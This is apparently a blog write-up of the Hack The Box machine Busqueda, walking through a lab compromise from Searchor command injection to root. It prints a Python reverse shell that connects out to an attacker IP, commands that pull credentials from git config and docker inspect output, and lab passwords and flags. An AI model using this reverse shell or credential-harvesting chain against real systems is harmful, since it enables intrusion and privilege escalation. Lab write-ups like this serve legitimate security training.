---
layout: post
title:  HTB - Busqueda
subtitle: Pwning Busqueda
date:   2023-07-10
tags: [writeup, cybersecurity, hackthebox]
author: Patrick Castro
comments: True
---

This is how I pwned Busqueda.

<br>

## Initial Foothold

IP address
```
10.10.11.208 - Machine IP
10.10.16.23 - Attacker IP
```

Open Ports
```
22
80
```

Nmap Scan
```shell
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 21:45 EDT
Nmap scan report for 10.10.11.208
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.04 seconds
```

Adding the machine's IP address to my `/etc/hosts` file.
```shell
sudo nano /etc/hosts
[...]
10.10.11.208   searcher.htb
```

Running Nmap Scan again, to check if there are `.git` file hiding.
```shell
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 21:47 EDT
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.78 seconds
```

Accessing the port 80, and checking if the version of Searchor is vulnerable
```
view-source:http://searcher.htb/
Searchor 2.4.0 - https://github.com/ArjunSharda/Searchor
```

<br>

## Road to User

### Searchor 2.4.0
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-

Running the exploit grants a reverse shell on the netcat listener.
```shell
./exploit.sh searcher.htb 10.10.16.23 9001
```

<br>

### User.txt
```shell
find / -iname user.txt
cat /home/svc/user.txt
8b47f136443bcb0cf381ba4a3576f72f
```

<br>

## Path to Power (Gaining Administrator Access)

### Further Enumeration

Reading the `/etc/hosts` file of the machine reveals another asset.
```shell
svc@busqueda:/var/snap/core20/1822$ cat /etc/hosts
cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 busqueda searcher.htb gitea.searcher.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Adding the subdomain to my `/etc/hosts` file.
```shell
sudo nano /etc/hosts
[...]
10.10.11.208	searcher.htb gitea.searcher.htb
```

#### User Enumeration
```
http://gitea.searcher.htb/explore/users

administrator - Joined on Jan 4, 2023
cody - Joined on Jan 4, 2023
```

#### Finding cody creds

```shell
svc@busqueda:~$ cat .gitconfig
cat .gitconfig
[user]
	email = cody@searcher.htb
	name = cody
[core]
	hooksPath = no-hooks
```

```shell
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Cody Credentials
```
cody:jh1usoih2bkjaspwe92
cody@gitea.searcher.htb

http://gitea.searcher.htb/cody/Searcher_site.git
```

Using Cody's credential in API, this is later on a rabit hole.
```
http://gitea.searcher.htb/api/swagger
```

<br>

## Path to Power (Gaining Administrator Access)

### Further Enumeration

Reading the `/etc/passwd` file of the machine, there is no cody user on the machine.
```shell
svc@busqueda:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Using the password of cody to user `svc` through ssh.
```shell
ssh svc@searcher.htb

> A stable shell is achieved.
```

Checking what user `svc` can do.
```shell
svc@busqueda:~$ sudo -l

[...]
User svc may run the following commands on busqueda:
>     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Svc can use `sudo` through:
```shell
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
[sudo] password for svc: 
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Executing every action of that script.
Executing `docker-ps` of the script.
```shell
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   6 months ago   Up 39 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   6 months ago   Up 39 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```
> This shows that there are docker containers running named `gitea` and `mysql_db`.

Executing `docker-inspect` of the script.
```shell
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```
> This shows I can inspect the docker containers `gitea` and `mysql_db`.
> 
> Checking the docker inspect in Docker [documentation](https://docs.docker.com/engine/reference/commandline/inspect/)

Using `docker-inspect` to `gitea` container.
```shell
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
```

```shell
    [...]
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",
    "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
    [...]
```
> This returns more information, also the database name, database user, and its password.

Using `docker-inspect` to `mysql_db` container.
```shell
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
```

```shell
[...]
 "Env": [
    "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
    "MYSQL_USER=gitea",
    "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
    "MYSQL_DATABASE=gitea",
[...]
```
> This returns the MYSQL ROOT password, the MYSQL user and its password, and the database.
> Notice that there are passwords that are the same `yuiu1hoiu4i5ho1uh` in both `gitea` and `mysql_db` containers.


Executing `full-checkup` returns an error.
```shell
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

<br>

### Administrator

Using the password retrieved from `gitea` and `mysql_db` to `administrator` account in http://gitea.searcher.htb/.
```
http://gitea.searcher.htb/

administrator:yuiu1hoiu4i5ho1uh
administrator@gitea.searcher.htb
```

> I can now log in and check the repositories of the administrator account.
> There is are script in the scripts repo which are the same on the ones that are being executed in the docker earlier. 
> The `full-checkup` action in the `system-checkup.py` script, executes a `full-checkup.sh` script. 

Crafing a malicious `full-checkup.sh` that executes a reverse shell.
```shell
cd /var/tmp
touch full-checkup.sh
chmod +x full-checkup.sh
```

```python
#!/usr/bin/python3
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.4",9003)) # Attacker IP netcat listener
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

<br>

### Getting a shell
Running the malicious script, grants a root shell.
```shell
svc@busqueda:/var/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

<br>

### Root.txt
```shell
# cd /root
cd /root
# ls
ls
ecosystem.config.js  root.txt  scripts	snap
# cat root.txt
cat root.txt
26b22f48e4ff13580114a8d9fa9fc07d
```

That's how I pwned Busqueda.

<br>

### Achievement:
https://www.hackthebox.com/achievement/machine/743510/537